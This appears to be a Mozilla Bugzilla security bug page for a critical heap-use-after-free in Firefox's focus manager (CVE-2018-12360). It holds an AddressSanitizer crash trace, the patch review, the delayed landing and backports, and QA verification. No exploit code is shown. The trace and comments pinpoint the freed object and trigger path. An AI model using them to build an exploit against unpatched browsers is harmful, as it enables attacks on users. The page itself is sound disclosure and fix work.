#15 0x7f6e3d637c2a in JS::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12
#16 0x7f6e359cca75 in mozilla::dom::EventListener::HandleEvent(JSContext\*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:51:8
#17 0x7f6e36972c7e in HandleEvent<mozilla::dom::EventTarget \*> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12
#18 0x7f6e36972c7e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener\*, mozilla::dom::Event\*, mozilla::dom::EventTarget\*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118
#19 0x7f6e369743db in mozilla::EventListenerManager::HandleEventInternal(nsPresContext\*, mozilla::WidgetEvent\*, mozilla::dom::Event\*\*, mozilla::dom::EventTarget\*, nsEventStatus\*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1288:20
#20 0x7f6e3695ea87 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback\*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:560:14
#21 0x7f6e36962583 in mozilla::EventDispatcher::Dispatch(nsISupports\*, nsPresContext\*, mozilla::WidgetEvent\*, mozilla::dom::Event\*, nsEventStatus\*, mozilla::EventDispatchingCallback\*, nsTArray<mozilla::dom::EventTarget\*>\*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9
#22 0x7f6e36964abb in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports\*, mozilla::WidgetEvent\*, mozilla::dom::Event\*, nsPresContext\*, nsEventStatus\*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp
#23 0x7f6e33ea7bf8 in nsINode::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1079:5
#24 0x7f6e36982ea3 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:204:13
#25 0x7f6e368f8e8c in mozilla::AsyncEventDispatcher::Run() /builds/worker/workspace/build/src/dom/events/AsyncEventDispatcher.cpp:68:12
#26 0x7f6e339f904f in nsContentUtils::RemoveScriptBlocker() /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5635:15
#27 0x7f6e33dd7027 in nsDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5105:3
#28 0x7f6e36d5849c in nsHTMLDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2120:15
#29 0x7f6e38a79e1a in ~mozAutoDocConditionalContentUpdateBatch /builds/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:83:18
#30 0x7f6e38a79e1a in ModifyDeclaration<(lambda at /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:297:5)> /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:287
#31 0x7f6e38a79e1a in nsDOMCSSDeclaration::ParsePropertyValue(nsCSSPropertyID, nsTSubstring<char16\_t> const&, bool, nsIPrincipal\*) /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:295
#32 0x7f6e34373c9a in SetMargin /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ServoCSSPropList.h:456:1
#33 0x7f6e34373c9a in mozilla::dom::CSS2PropertiesBinding::set\_margin(JSContext\*, JS::Handle<JSObject\*>, nsDOMCSSDeclaration\*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:31017
#34 0x7f6e3623e223 in bool mozilla::dom::binding\_detail::GenericSetter<mozilla::dom::binding\_detail::NormalThisPolicy>(JSContext\*, unsigned int, JS::Value\*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3204:8
#35 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15
#36 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467
#37 0x7f6e3cb08c26 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:516:12
#38 0x7f6e3cb08c26 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535
#39 0x7f6e3cb08c26 in js::CallSetter(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:664
previously allocated by thread T0 (file:// Content) here:
#0 0x4c54b3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_malloc\_linux.cc:88:3
#1 0x4f5f7d in moz\_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17
#2 0x7f6e36bb06b9 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:156:12
#3 0x7f6e36bb06b9 in NS\_NewHTMLInputElement(already\_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:120
#4 0x7f6e36d38569 in CreateHTMLElement(unsigned int, already\_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:252:41
#5 0x7f6e33a21937 in nsContentUtils::NewXULOrHTMLElement(mozilla::dom::Element\*\*, mozilla::dom::NodeInfo\*, mozilla::dom::FromParser, nsAtom\*, mozilla::dom::CustomElementDefinition\*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:10017:18
#6 0x7f6e36d384c8 in NS\_NewHTMLElement(mozilla::dom::Element\*\*, already\_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAtom\*, mozilla::dom::CustomElementDefinition\*) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:235:10
#7 0x7f6e33e211a0 in nsIDocument::CreateHTMLElement(nsAtom\*) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:12378:28
#8 0x7f6e390c5dbe in nsNumberControlFrame::MakeAnonymousElement(mozilla::dom::Element\*\*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&, nsAtom\*, mozilla::CSSPseudoElementType) /builds/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:331:40
#9 0x7f6e390c63eb in nsNumberControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /builds/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:378:8
#10 0x7f6e38bff0ae in nsCSSFrameConstructor::GetAnonymousContent(nsIContent\*, nsIFrame\*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4172:26
#11 0x7f6e38bf27fe in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent\*, mozilla::ComputedStyle\*, nsContainerFrame\*, bool, nsFrameItems&, bool, PendingBinding\*, nsIFrame\*) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10265:3
#12 0x7f6e38c086e1 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame\*, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4041:9
#13 0x7f6e38c11390 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame\*, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6073:3
#14 0x7f6e38bf1ee5 in nsCSSFrameConstructor::ConstructFramesFromItemList(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList&, nsContainerFrame\*, bool, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10144:5
#15 0x7f6e38c1e370 in nsCSSFrameConstructor::ContentAppended(nsIContent\*, nsCSSFrameConstructor::InsertionKind) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7267:3
#16 0x7f6e38bad73f in mozilla::RestyleManager::ProcessRestyledFrames(nsStyleChangeList&) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:1401:27
#17 0x7f6e38bbaa95 in mozilla::RestyleManager::DoProcessPendingRestyles(mozilla::ServoTraversalFlags) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:3000:9
#18 0x7f6e38b72723 in ProcessPendingRestyles /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:3077:3
#19 0x7f6e38b72723 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4316
#20 0x7f6e33df3d68 in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:592:5
#21 0x7f6e33df3d68 in nsIDocument::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7589
#22 0x7f6e33e449d9 in FlushPendingNotifications /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7528:3
#23 0x7f6e33e449d9 in nsFocusManager::CheckIfFocusable(mozilla::dom::Element\*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1605
#24 0x7f6e33e40fed in nsFocusManager::SetFocusInner(mozilla::dom::Element\*, int, bool, bool) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1226:36
#25 0x7f6e33e445ca in nsFocusManager::SetFocus(mozilla::dom::Element\*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:518:3
#26 0x7f6e36cd7df4 in mozilla::dom::HTMLTextAreaElement::Select() /builds/worker/workspace/build/src/dom/html/HTMLTextAreaElement.cpp:156:11
#27 0x7f6e360533b7 in mozilla::dom::HTMLTextAreaElementBinding::select(JSContext\*, JS::Handle<JSObject\*>, mozilla::dom::HTMLTextAreaElement\*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLTextAreaElementBinding.cpp:1390:9
#28 0x7f6e36240b21 in bool mozilla::dom::binding\_detail::GenericMethod<mozilla::dom::binding\_detail::NormalThisPolicy, mozilla::dom::binding\_detail::ThrowExceptions>(JSContext\*, unsigned int, JS::Value\*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13
#29 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15
#30 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467
#31 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12
#32 0x7f6e3caf06bf in Interpret(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086
#33 0x7f6e3cad6d63 in js::RunScript(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12
#34 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15
#35 0x7f6e3cb06ff2 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10
SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsINode.h:1644:12 in GetBoolFlag
Shadow bytes around the buggy address:
0x0c2a8003a820: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a830: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a840: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a850: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa
0x0c2a8003a860: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c2a8003a870: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a890: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a8003a8a0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
0x0c2a8003a8b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x0c2a8003a8c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==10502==ABORTING

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1459693#c1)• 7 years ago |
|  | |

Attached file
[ASAN output](attachment.cgi?id=8973768)
— [Details](attachment.cgi?id=8973768&action=edit)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1459693#c2)• 7 years ago |
|  | |

Any ideas, Olli? It looks like you touched nsFocusManager.cpp most recently.Group: core-security → dom-core-securityFlags: needinfo?(bugs)Keywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)Priority: -- → P1

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a4955_546716)• 7 years ago |

Flags: needinfo?(emilio)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1459693#c3)• 7 years ago |
|  | |

Stack trace is pretty obvious.Assignee: nobody → bugsFlags: needinfo?(bugs)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1459693#c4)• 7 years ago |
|  | |

Attached patch

[focus\_crash.diff](attachment.cgi?id=8973850&action=diff)
— [Details](attachment.cgi?id=8973850&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)

this is what the stack trace hinted was going wrong, and verified using
asan + fuzz build that this seems to actually fix the bug.
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: review?(continuation)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1459693#c5)• 7 years ago |
|  | |

Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
focus\_crash.diff
Review of [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850):
-----------------------------------------------------------------
Gah, I wish we had some static analysis for this. Thanks for fixing!
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: review?(continuation) → review+

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1459693#c6)• 7 years ago |
|  | |

Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
focus\_crash.diff
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
The patch does pinpoint what kind of issue is being fixed.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
The commit message could be
-m "[Bug 1459693](/show_bug.cgi?id=1459693 "RESOLVED FIXED - heap-use-after-free in nsFocusManager::CheckIfFocusable"), ensure the right anonymous element is focused when calling input.focus(), r=mccr8"
Which older supported branches are affected by this flaw?
all
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
The code seems to be untouched since 2011, so the same patch should apply on supported branches
How likely is this patch to cause regressions; how much testing does it need?
Very unlikely to cause regressions. Just keeping an object alive a bit longer.
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: sec-approval?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr60?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr52?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-beta?

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a20119_546716)• 7 years ago |

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1459693#c7)• 7 years ago |
|  | |

(In reply to Andrew McCreight [:mccr8] from [comment #5](/show_bug.cgi?id=1459693#c5 "RESOLVED FIXED - heap-use-after-free in nsFocusManager::CheckIfFocusable"))
> Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
> focus\_crash.diff
>
> Review of [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850):
> -----------------------------------------------------------------
>
> Gah, I wish we had some static analysis for this. Thanks for fixing!
We have MOZ\_CAN\_RUN\_SCRIPT fwiw, stuff just needs annotating.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a25200_75935)• 7 years ago |

[status-firefox60](/buglist.cgi?f1=cf_status_firefox60&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox60&o1=equals&v1=wontfix)
[status-firefox61](/buglist.cgi?f1=cf_status_firefox61&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=affected)
[status-firefox62](/buglist.cgi?f1=cf_status_firefox62&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=affected)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected)
[tracking-firefox61](/buglist.cgi?f1=cf_tracking_firefox61&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox61&o1=equals&v1=%2B)
[tracking-firefox62](/buglist.cgi?f1=cf_tracking_firefox62&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox62&o1=equals&v1=%2B)
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
--- → [61+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=61%2B)
[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
--- → [61+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=61%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1459693#c8)• 7 years ago |
|  | |

Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
focus\_crash.diff
Under the assumption that this is going to have a delayed landing, I'm clearing the uplift requests for now so they're not inactionably on the request radar for the next few weeks.
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr60?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr52?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-beta?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1459693#c9)• 7 years ago |
|  | |

sec-approval+ to land in three weeks, on May 30, to reduce the window of exposure. Once it is on trunk then, we'll want branch patches for Beta and both ESR branches made and nominated.Whiteboard: [checkin on 5/30]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a172394_280903)• 7 years ago |

[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: sec-approval? → sec-approval+

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1459693#c10)• 7 years ago |
|  | |

Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
focus\_crash.diff
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
this is sec-crit
User impact if declined:
security sensitive crash
Fix Landed on Version:
62
Risk to taking this patch (and alternatives if risky):
should be very safe
String or UUID changes made by this patch:
NA
[Feature/Bug causing the regression]:
old stuff
[Is this code covered by automated tests?]:
nope
[Has the fix been verified in Nightly?]:
not yet
[Is the change risky?]:
nope
[Why is the change risky/not risky?]:
just using RefPtr and not raw pointer.
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr60?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr52?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-beta?

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1459693#c11)• 7 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/8398d902299c9df8c0cb522d2d34c1419ee2682b>

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1459693#c12)• 7 years ago |
|  | |

Comment on [attachment 8973850](/attachment.cgi?id=8973850 "focus_crash.diff") [[details]](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") [[diff]](/attachment.cgi?id=8973850&action=diff "focus_crash.diff") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850)
focus\_crash.diff
CI results on inbound all look good. Approved for 61.0b10, ESR 60.1, and ESR 52.9.
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr60?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr60+
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr52?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-esr52+
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-beta?
[Attachment #8973850](/attachment.cgi?id=8973850&action=edit "focus_crash.diff") -
Flags: approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1459693#c13)• 7 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/409cd4e30401>Group: dom-core-security → core-security-release
[status-firefox61](/buglist.cgi?f1=cf_status_firefox61&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=fixed)Whiteboard: [checkin on 5/30]

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1459693#c14)• 7 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr60/rev/34f8ad2b2793>
<https://hg.mozilla.org/releases/mozilla-esr52/rev/face7a3dd5d7>
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=fixed)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1459693#c15)• 7 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/8398d902299c>Status: NEW → RESOLVEDClosed: 7 years ago
[status-firefox62](/buglist.cgi?f1=cf_status_firefox62&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla62

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a3663202_280903)• 7 years ago |

Whiteboard: [adv-main61+][adv-esr52.9+][adv-esr60.1+]

|  | [Andrei Vaida [:avaida]](/user_profile?user_id=488993) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a3688575_488993)• 7 years ago |

Flags: qe-verify+Whiteboard: [adv-main61+][adv-esr52.9+][adv-esr60.1+] → [adv-main61+][adv-esr52.9+][adv-esr60.1+][post-critsmash-triage]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a3806741_280903)• 7 years ago |

Alias: CVE-2018-12360

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1459693#c16)• 7 years ago |
|  | |

I managed to reproduce the crash with the testcase from [comment 0](/show_bug.cgi?id=1459693#c0 "RESOLVED FIXED - heap-use-after-free in nsFocusManager::CheckIfFocusable") on Linux 16.04 using ASAN fuzzy build downloaded from: <https://tools.taskcluster.net/index/gecko.v2.mozilla-central.pushdate.2018.05.07.20180507085353.firefox/linux64-fuzzing-asan-opt>
I verified as fixed on Linux with the latest asan fuzzy build downloaded from:
<https://tools.taskcluster.net/index/gecko.v2.mozilla-central.latest.firefox/linux64-fuzzing-asan-opt>
Also verified as fixed on Linux 16.04, Windows 10x64 and Mac OS X 10.13 on latest Nightly 62.0a1, Build ID 20180621013659 and Beta Candidate 62.0b1, Build ID 20180619022742.
